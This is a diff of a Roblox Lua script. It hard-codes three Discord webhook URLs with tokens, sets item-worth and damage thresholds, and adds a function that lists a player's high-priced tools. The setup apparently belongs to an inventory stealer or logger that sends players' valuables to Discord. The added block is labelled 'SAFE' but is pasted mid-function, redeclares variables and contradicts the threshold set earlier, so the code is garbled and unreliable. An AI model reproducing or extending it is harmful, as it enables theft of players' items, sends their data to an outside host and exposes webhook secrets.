@@ -9,7 +9,8 @@ local webhook = "https://discord.com/api/webhooks/1409938814801281094/otKFWEw2Ic
 local public = "https://discord.com/api/webhooks/1425006245265412139/tLP2BVXCB2-gNzZKe2fKVTg7aWddJe4Qlpx3LjnL9fKrBp_6YlKABZE-e41T50jVx0DJ"
 local member = "https://discord.com/api/webhooks/1425346517614596288/CIcV3cho3_3hj6w1L_Lb2fimF0-kXnoYjjf-XKEOQdwbcyoCnN18GcPo03zAl1k2SMDb"
 local minworth = 200000
-local mindamage = 100000
+local minvalue = 60000000
+local mindamage = 60000
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -240,6 +241,56 @@ local function collectInventoryItems1()
             end
         end
     end
+-- SAFE: find items that meet minvalue. Local only, no transfers.
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local backpack = localPlayer:WaitForChild("Backpack")
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+
+local minvalue = 600000000 -- set as you like
+
+local function getItemsByMinValue(minvalue)
+    local matches = {}
+
+    local function checkContainer(container)
+        for _, obj in ipairs(container:GetChildren()) do
+            if obj:IsA("Tool") then
+                if not obj.Name:find("Seed") then -- match original intent
+                    local price = obj:GetAttribute("Price")
+                    if not price then
+                        local priceObj = obj:FindFirstChild("Price")
+                        if priceObj and priceObj:IsA("NumberValue") then
+                            price = priceObj.Value
+                        end
+                    end
+                    price = price or 0
+                    if price >= minvalue then
+                        table.insert(matches, {
+                            instance = obj,
+                            name = obj.Name,
+                            price = price
+                        })
+                    end
+                end
+            end
+        end
+    end
+
+    checkContainer(backpack)
+    checkContainer(character)
+    return matches
+end
+
+-- Example usage:
+local found = getItemsByMinValue(minvalue)
+if #found == 0 then
+    print("No items >= minvalue (" .. tostring(minvalue) .. ")")
+else
+    for i, info in ipairs(found) do
+        print(i, info.name, "Price:", info.price, "Instance:", info.instance)
+    end
+end
+
 
     checkContainer(backpack)
     checkContainer(character)
